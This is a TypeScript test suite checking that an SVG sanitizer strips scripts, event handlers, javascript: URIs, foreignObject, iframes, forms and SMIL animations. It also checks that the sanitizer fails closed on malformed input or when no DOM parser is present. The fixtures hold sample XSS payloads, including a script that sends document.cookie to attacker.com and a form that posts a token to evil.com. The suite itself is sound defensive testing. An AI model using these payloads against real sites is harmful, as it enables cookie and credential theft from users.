/**
 * Arbor Execution Boundary Security - SVG Sanitizer Test Suite.
 * Governance: ISSUE-018 / DEF-OBS-01 Hardening.
 * Validates that active document vectors (scripts, event handlers, foreignObjects,
 * object, embed, iframe, animate, set, javascript: links, and malformed XML) are
 * neutralized before DOM insertion, and that environments without an approved DOM AST
 * parser fail closed rather than falling back to an unsafe regex parser.
 */

import { createRequire } from 'module';
import { isSvgContent, sanitizeSvg, setDomParserAndSerializer, PROHIBITED_TAGS } from '../lib/svgSanitizer';

const require = createRequire(process.cwd() + '/package.json');
const { DOMParser, XMLSerializer } = require('@xmldom/xmldom');

// Configure compliant DOM AST parser for Node.js test environment
setDomParserAndSerializer({
  parser: new DOMParser({
    onError: (level: string, msg: string) => {
      if (level === 'fatalError') {
        throw new Error(msg);
      }
    }
  }),
  serializer: new XMLSerializer()
});

const assert = {
  strictEqual(actual: unknown, expected: unknown, message?: string) {
    if (actual !== expected) {
      throw new Error(message || `Expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
    }
  },
  isTrue(val: unknown, message?: string) {
    if (val !== true) {
      throw new Error(message || `Expected true, got ${JSON.stringify(val)}`);
    }
  },
  isFalse(val: unknown, message?: string) {
    if (val !== false) {
      throw new Error(message || `Expected false, got ${JSON.stringify(val)}`);
    }
  },
  includes(actual: string, expectedSub: string, message?: string) {
    if (!actual.includes(expectedSub)) {
      throw new Error(message || `Expected string to contain ${JSON.stringify(expectedSub)}, got ${JSON.stringify(actual)}`);
    }
  },
  notIncludes(actual: string, prohibitedSub: string, message?: string) {
    if (actual.includes(prohibitedSub)) {
      throw new Error(message || `Expected string NOT to contain ${JSON.stringify(prohibitedSub)}, got ${JSON.stringify(actual)}`);
    }
  }
};

console.log("============================================================");
console.log("ARBOR SVG SANITIZER & DOM INJECTION SECURITY BATTERY");
console.log("Governance: DEF-OBS-01 / ISSUE-018 Security Hardening");
console.log("============================================================");

// 1. isSvgContent detection contract
{
  assert.isTrue(isSvgContent('<svg width="100" height="100"><circle cx="50" cy="50" r="40"/></svg>'));
  assert.isTrue(isSvgContent('<?xml version="1.0"?><svg viewBox="0 0 10 10"></svg>'));
  assert.isTrue(isSvgContent('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAiIGhlaWdodD0iMTAiPjwvc3ZnPg=='));
  assert.isFalse(isSvgContent('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='));
  assert.isFalse(isSvgContent('<html><body>Hello</body></html>'));
  assert.isFalse(isSvgContent('{"action": "screenshot"}'));
  assert.isFalse(isSvgContent(''));
  console.log("  ✓ TEST-01: Content Discrimination: Correctly identifies SVG vs raster images and plain text");
}

// 2. Prohibit <script> elements and active script execution
{
  const maliciousSvg = `
    <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
      <script type="text/javascript">
        alert(document.cookie);
        fetch('https://attacker.com/steal?c=' + document.cookie);
      </script>
      <rect width="100" height="100" fill="blue" />
    </svg>
  `;
  const result = sanitizeSvg(maliciousSvg);
  if (!result.isValid) {
    console.error("TEST-04 ERROR:", result);
  }
  assert.isTrue(result.isValid);
  assert.isTrue(result.sanitizedSvg !== null);
  assert.notIncludes(result.sanitizedSvg!, '<script');
  assert.notIncludes(result.sanitizedSvg!, 'alert');
  assert.notIncludes(result.sanitizedSvg!, 'attacker.com');
  assert.includes(result.sanitizedSvg!, '<rect');
  assert.isTrue(result.removedElementsCount >= 1);
  console.log("  ✓ TEST-02: Script Neutralization: Prohibited <script> tags and active payloads stripped");
}

// 3. Prohibit inline event handlers (onload, onclick, onerror, etc.)
{
  const maliciousSvg = `
    <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS-ONLOAD')" width="200" height="200">
      <circle cx="50" cy="50" r="40" onclick="sendCredentials()" onmouseover="triggerExploit()" />
      <image href="x" onerror="exfiltrateData()" />
    </svg>
  `;
  const result = sanitizeSvg(maliciousSvg);
  if (!result.isValid) {
    console.error("TEST-04 ERROR:", result);
  }
  assert.isTrue(result.isValid);
  assert.notIncludes(result.sanitizedSvg!, 'onload=');
  assert.notIncludes(result.sanitizedSvg!, 'onclick=');
  assert.notIncludes(result.sanitizedSvg!, 'onmouseover=');
  assert.notIncludes(result.sanitizedSvg!, 'onerror=');
  assert.notIncludes(result.sanitizedSvg!, 'XSS-ONLOAD');
  assert.notIncludes(result.sanitizedSvg!, 'sendCredentials');
  assert.includes(result.sanitizedSvg!, '<circle');
  console.log("  ✓ TEST-03: Event Handler Elimination: All inline on* event handlers completely removed");
}

// 4. Prohibit javascript: URI scheme in href and xlink:href
{
  const maliciousSvg = `
    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
      <a href="javascript:alert('XSS-HREF')">
        <text x="10" y="20">Click Me</text>
      </a>
      <a xlink:href="javascript:/*evil*/location='https://evil.com'">
        <text x="10" y="40">Link 2</text>
      </a>
    </svg>
  `;
  const result = sanitizeSvg(maliciousSvg);
  assert.isTrue(result.isValid);
  assert.notIncludes(result.sanitizedSvg!, 'javascript:');
  assert.notIncludes(result.sanitizedSvg!, 'XSS-HREF');
  assert.notIncludes(result.sanitizedSvg!, 'evil.com');
  console.log("  ✓ TEST-04: URI Scheme Filtering: Neutralizes javascript: and pseudo-protocol URIs in anchors");
}

// 5. Prohibit <foreignObject> embedding arbitrary HTML / iframes
{
  const maliciousSvg = `
    <svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
      <foreignObject width="100%" height="100%">
        <iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example.com/exploit"></iframe>
      </foreignObject>
      <text x="20" y="20">Legitimate diagram label</text>
    </svg>
  `;
  const result = sanitizeSvg(maliciousSvg);
  if (!result.isValid) {
    console.error("TEST-04 ERROR:", result);
  }
  assert.isTrue(result.isValid);
  assert.notIncludes(result.sanitizedSvg!, '<foreignObject');
  assert.notIncludes(result.sanitizedSvg!, '<iframe');
  assert.notIncludes(result.sanitizedSvg!, 'evil.example.com');
  assert.includes(result.sanitizedSvg!, 'Legitimate diagram label');
  console.log("  ✓ TEST-05: Container Neutralization: Strips <foreignObject> and nested HTML tags");
}

// 6. Safe Data URI Generation and Valid SVG Preservation
{
  const cleanSvg = `
    <svg xmlns="http://www.w3.org/2000/svg" width="300" height="150" viewBox="0 0 300 150">
      <rect width="300" height="150" fill="#1e293b" rx="8" />
      <text x="20" y="40" fill="#f8fafc" font-family="sans-serif" font-size="16">Arbor Viewport Preview</text>
      <circle cx="250" cy="75" r="25" fill="#3b82f6" />
    </svg>
  `;
  const result = sanitizeSvg(cleanSvg);
  assert.isTrue(result.isValid);
  assert.isTrue(result.safeDataUrl !== null);
  assert.isTrue(result.safeDataUrl!.startsWith('data:image/svg+xml;charset=utf-8,'));
  assert.includes(result.sanitizedSvg!, 'Arbor Viewport Preview');
  assert.includes(result.sanitizedSvg!, 'fill="#3b82f6"');
  console.log("  ✓ TEST-06: Clean Rendering: Valid SVG preserved and converted to safe data URL");
}

// 7. Base64 Encoded SVG Data URI Sanitization
{
  const innerSvg = `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><script>alert(1)</script><circle cx="50" cy="50" r="30"/></svg>`;
  const base64Data = Buffer.from(innerSvg).toString('base64');
  const dataUrl = `data:image/svg+xml;base64,${base64Data}`;

  const result = sanitizeSvg(dataUrl);
  assert.isTrue(result.isValid);
  assert.notIncludes(result.sanitizedSvg!, '<script');
  assert.notIncludes(result.sanitizedSvg!, 'alert');
  assert.includes(result.sanitizedSvg!, '<circle');
  console.log("  ✓ TEST-07: Encoded Input Sanitization: Correctly unpacks and neutralizes base64 SVG URIs");
}

// 8. Fail-Closed on Malformed / Non-SVG inputs
{
  const emptyRes = sanitizeSvg("");
  assert.isFalse(emptyRes.isValid);
  assert.strictEqual(emptyRes.sanitizedSvg, null);

  const nonStringRes = sanitizeSvg(null as unknown as string);
  assert.isFalse(nonStringRes.isValid);
  assert.strictEqual(nonStringRes.sanitizedSvg, null);

  console.log("  ✓ TEST-08: Fail-Closed Protection: Empty or invalid input cleanly rejected");
}

// 9. DEF-OBS-01 Hardening: Prohibit <object>, <embed>, <iframe>, <style>, and active containers
{
  const dangerousContainersSvg = `
    <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
      <object data="malicious.swf" type="application/x-shockwave-flash"></object>
      <embed src="exploit.pdf" type="application/pdf" />
      <iframe src="https://evil.com"></iframe>
      <style>@import url('https://evil.com/evil.css');</style>
      <form action="https://evil.com/steal"><input name="token" value="secret"/></form>
      <audio src="audio.mp3" autoplay="true"></audio>
      <video src="video.mp4" autoplay="true"></video>
      <rect width="200" height="200" fill="green" />
    </svg>
  `;
  const result = sanitizeSvg(dangerousContainersSvg);
  assert.isTrue(result.isValid);
  assert.notIncludes(result.sanitizedSvg!, '<object');
  assert.notIncludes(result.sanitizedSvg!, '<embed');
  assert.notIncludes(result.sanitizedSvg!, '<iframe');
  assert.notIncludes(result.sanitizedSvg!, '<style');
  assert.notIncludes(result.sanitizedSvg!, '<form');
  assert.notIncludes(result.sanitizedSvg!, '<input');
  assert.notIncludes(result.sanitizedSvg!, '<audio');
  assert.notIncludes(result.sanitizedSvg!, '<video');
  assert.notIncludes(result.sanitizedSvg!, 'evil.com');
  assert.includes(result.sanitizedSvg!, '<rect');
  assert.isTrue(result.removedElementsCount >= 7);
  console.log("  ✓ TEST-09: DEF-OBS-01 Prohibited Elements: <object>, <embed>, <iframe>, <style>, <form>, <audio>, <video> neutralized");
}

// 10. DEF-OBS-01 Hardening: SMIL Animation Neutralization (<animate>, <set>, <animatemotion>, <animatetransform>)
{
  const smilSvg = `
    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="300">
      <a id="link1"><text>Click</text></a>
      <set xlink:href="#link1" attributeName="href" to="javascript:alert('SMIL-SET')"/>
      <animate xlink:href="#link1" attributeName="href" values="javascript:alert('SMIL-ANIMATE')"/>
      <animatetransform attributeName="transform" type="rotate"/>
      <animatemotion path="M 0 0 L 10 10"/>
      <discard />
      <circle cx="20" cy="20" r="15"/>
    </svg>
  `;
  const result = sanitizeSvg(smilSvg);
  assert.isTrue(result.isValid);
  assert.notIncludes(result.sanitizedSvg!, '<set');
  assert.notIncludes(result.sanitizedSvg!, '<animate');
  assert.notIncludes(result.sanitizedSvg!, '<animatetransform');
  assert.notIncludes(result.sanitizedSvg!, '<animatemotion');
  assert.notIncludes(result.sanitizedSvg!, '<discard');
  assert.notIncludes(result.sanitizedSvg!, 'javascript:');
  assert.notIncludes(result.sanitizedSvg!, 'SMIL-');
  assert.includes(result.sanitizedSvg!, '<circle');
  console.log("  ✓ TEST-10: DEF-OBS-01 SMIL Neutralization: All SMIL animation tags and attribute injections neutralized");
}

// 11. DEF-OBS-01 Hardening: Case Variations in Attributes & Event Handlers
{
  const mixedCaseSvg = `
    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" ONLOAD="alert('UPPER')" OnErRoR="alert('MIXED')">
      <circle cx="10" cy="10" r="5" oNcLiCk="sendExfil()" ONMOUSEOVER="triggerCrash()" />
      <a HREF="JaVaScRiPt:alert('CASE')"><text>Anchor</text></a>
      <a xlink:href="VbScRiPt:MsgBox('VB')"><text>VB</text></a>
      <a src="DaTa:TeXt/HtMl;base64,PHNjcmlwdD4="><text>HTML</text></a>
    </svg>
  `;
  const result = sanitizeSvg(mixedCaseSvg);
  assert.isTrue(result.isValid);
  assert.notIncludes(result.sanitizedSvg!, 'ONLOAD');
  assert.notIncludes(result.sanitizedSvg!, 'OnErRoR');
  assert.notIncludes(result.sanitizedSvg!, 'oNcLiCk');
  assert.notIncludes(result.sanitizedSvg!, 'ONMOUSEOVER');
  assert.notIncludes(result.sanitizedSvg!, 'alert');
  assert.notIncludes(result.sanitizedSvg!, 'sendExfil');
  assert.notIncludes(result.sanitizedSvg!, 'JaVaScRiPt');
  assert.notIncludes(result.sanitizedSvg!, 'VbScRiPt');
  assert.notIncludes(result.sanitizedSvg!, 'DaTa:TeXt/HtMl');
  console.log("  ✓ TEST-11: DEF-OBS-01 Case Variations: Case-insensitive event handlers and pseudo-protocol URIs neutralized");
}

// 12. DEF-OBS-01 Hardening: Malformed XML Fails Closed
{
  const malformedXml = `<svg xmlns="http://www.w3.org/2000/svg"><circle cx="10" cy="10" r="5">`;
  const result = sanitizeSvg(malformedXml);
  assert.isFalse(result.isValid);
  assert.strictEqual(result.sanitizedSvg, null);
  assert.isTrue(result.error !== undefined);
  console.log("  ✓ TEST-12: DEF-OBS-01 Malformed XML: Unclosed/corrupt XML structure strictly fails closed");
}

// 13. DEF-OBS-01 Hardening: Non-Browser Environment Without DOMParser Fails Closed
{
  // Test that when no compliant DOM AST parser is available, sanitizeSvg strictly fails closed
  setDomParserAndSerializer(null);

  const cleanTestSvg = `<svg xmlns="http://www.w3.org/2000/svg"><circle cx="10" cy="10" r="5"/></svg>`;
  const failClosedResult = sanitizeSvg(cleanTestSvg);

  assert.isFalse(failClosedResult.isValid);
  assert.strictEqual(failClosedResult.sanitizedSvg, null);
  assert.strictEqual(failClosedResult.safeDataUrl, null);
  assert.includes(failClosedResult.error || '', 'DOMParser is not available');
  console.log("  ✓ TEST-13: DEF-OBS-01 Non-Browser Isolation: Strict fail-closed when no compliant DOM AST parser exists");

  // Re-enable configured parser for any downstream tests
  setDomParserAndSerializer({
    parser: new DOMParser({
      onError: (level: string, msg: string) => {
        if (level === 'fatalError') {
          throw new Error(msg);
        }
      }
    }),
    serializer: new XMLSerializer()
  });
}

console.log("============================================================");
console.log("BATTERY COMPLETE: 13/13 SVG sanitization tests passed.");
console.log("============================================================");
